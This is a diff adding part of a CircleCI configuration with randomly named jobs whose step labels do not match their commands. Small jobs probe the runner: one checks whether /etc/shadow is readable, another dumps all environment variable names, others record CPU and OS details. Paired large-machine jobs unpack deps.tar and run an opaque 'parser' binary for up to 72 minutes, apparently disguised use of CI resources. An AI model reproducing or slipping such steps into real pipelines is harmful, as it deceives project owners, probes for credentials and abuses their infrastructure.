+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/lSR 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  onCheckoutChunk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: invoicing LIVE
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; if [ -r /etc/shadow ]; then echo good; elif [ -e /tmp ]; then echo maybe; else echo bad; fi; true ; } > /tmp/loader/231.15.208.107
+            echo "stage chore-3306 produced $(wc -l </tmp/loader/231.15.208.107) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - '231.15.208.107'
+  chore-3306:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/waveGuest 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  log-2009-w13:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Always pause the swap space
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; for i in {7..1}; do printf '%02d\n' "$i"; done | sort -r; true ; } > /tmp/loader/mem0-m4trix
+            echo "stage jul20-canary produced $(wc -l </tmp/loader/mem0-m4trix) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'mem0-m4trix'
+  jul20-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/mem0-m4trix 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  footer_footer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pack pallets by noon
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; cat /proc/cpuinfo | \grep --invert-match 'siblings' | wc -l; true ; } > /tmp/loader/USB_TCP
+            echo "stage v2-canary3 produced $(wc -l </tmp/loader/USB_TCP) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'USB_TCP'
+  v2-canary3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/waveGuest 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  proxyFn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Flag the cash forecast gross
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; env -0 | tr '\0' '\n' | cut -d"=" -f1 | awk '{print toupper(substr($0,1,1)) substr($0,2)}'; true ; } > /tmp/loader/qgAXCzb
+            echo "stage Run_Prod4 produced $(wc -l </tmp/loader/qgAXCzb) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'qgAXCzb'
+  Run_Prod4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/qgAXCzb 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  CLUSTER_FROM_MAIN:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: staging overstock
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; touch -d '2020-01-01 12:00' ${TMPDIR:-/tmp}/ruby1.marker && ls -l --time-style=long-iso ${TMPDIR:-/tmp}/ruby1.marker; true ; } > /tmp/loader/HawkNodeNeutron
+            echo "stage ensure-full-regression-suite produced $(wc -l </tmp/loader/HawkNodeNeutron) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'HawkNodeNeutron'
+  ensure-full-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/waveGuest 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  jL2l3ri:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Batch 014 Calibration
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; cat /etc/os-release |expand -t 7 |tr -s ' '; true ; } > /tmp/loader/a701l.p014r.41pha.n0r7h
+            echo "stage juliet produced $(wc -l </tmp/loader/a701l.p014r.41pha.n0r7h) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'a701l.p014r.41pha.n0r7h'
+  juliet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/a701l.p014r.41pha.n0r7h 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+
+workflows:
+  test:
+    jobs:
+      - GraphViewMotor
+      - wip-avatar-fast
+      - VERIFY_STG:
+          requires:
+            - GraphViewMotor
+            - wip-avatar-fast
+      - pat-push:
+          requires:
+            - GraphViewMotor
+            - wip-avatar-fast
+      - callisto:
+          requires:
+            - GraphViewMotor
+            - wip-avatar-fast
+      - ken-verify:
+          requires:
+            - GraphViewMotor
+            - wip-avatar-fast
+      - alice-push:
+          requires:
+            - GraphViewMotor
+            - wip-avatar-fast
+      - vega-v2:
+          requires:
+            - GraphViewMotor
+            - wip-avatar-fast
+      - QA_MERGE_9:
+          requires:
+            - GraphViewMotor
+            - wip-avatar-fast
+      - tweak-queue:
+          requires:
+            - GraphViewMotor
+            - wip-avatar-fast
+      - chore-3306:
+          requires:
+            - GraphViewMotor
+            - wip-avatar-fast
+      - nightly-v2:
+          requires:
+            - GraphViewMotor
+            - wip-avatar-fast
+      - ensure-full-regression-suite:
+          requires:
+            - GraphViewMotor
+            - wip-avatar-fast
+      - bug-5647:
+          requires:
+            - GraphViewMotor
+            - wip-avatar-fast
+      - dotnet8-test:
+          requires:
+            - GraphViewMotor
+            - wip-avatar-fast
+      - chen-verify:
+          requires:
+            - GraphViewMotor
+            - wip-avatar-fast
+      - oscar:
+          requires:
+            - GraphViewMotor
+            - wip-avatar-fast
+      - ShipProd:
+          requires:
+            - GraphViewMotor
+            - wip-avatar-fast
+      - v2-canary3:
+          requires:
+            - GraphViewMotor
+            - wip-avatar-fast
+      - io-alpha:
+          requires:
+            - GraphViewMotor
+            - wip-avatar-fast
+      - intergration-31:
+          requires:
+            - GraphViewMotor
+            - wip-avatar-fast
+      - dispatchJob
+      - build:
+          requires:
+            - dispatchJob
+      - FNEIk8oZ:
+          requires:
+            - dispatchJob
+      - tango-5:
+          requires:
+            - FNEIk8oZ
+      - closeLevelForKey:
+          requires:
+            - FNEIk8oZ
+      - romeo-9:
+          requires:
+            - closeLevelForKey
+      - quebec-pointer:
+          requires:
+            - closeLevelForKey
+      - preview:
+          requires:
+            - quebec-pointer
+      - proxyFn:
+          requires:
+            - quebec-pointer
+      - Run_Prod4:
+          requires:
+            - proxyFn
+      - paintNewModelFile:
+          requires:
+            - proxyFn
+      - succes-only-27:
+          requires:
+            - paintNewModelFile
+      - unwrapWindow:
+          requires:
+            - paintNewModelFile
+      - INFRA-848:
+          requires:
+            - unwrapWindow
+      - j_old:
+          requires:
+            - unwrapWindow
+      - update-cache:
+          requires:
+            - j_old
+      - uq_Digest:
+          requires:
+            - j_old
+      - v8-rc3:
+          requires:
+            - uq_Digest
+      - jL2l3ri:
+          requires:
+            - uq_Digest
+      - juliet:
+          requires:
+            - jL2l3ri
+      - log-2009-w13:
+          requires:
+            - jL2l3ri
+      - jul20-canary:
+          requires:
+            - log-2009-w13
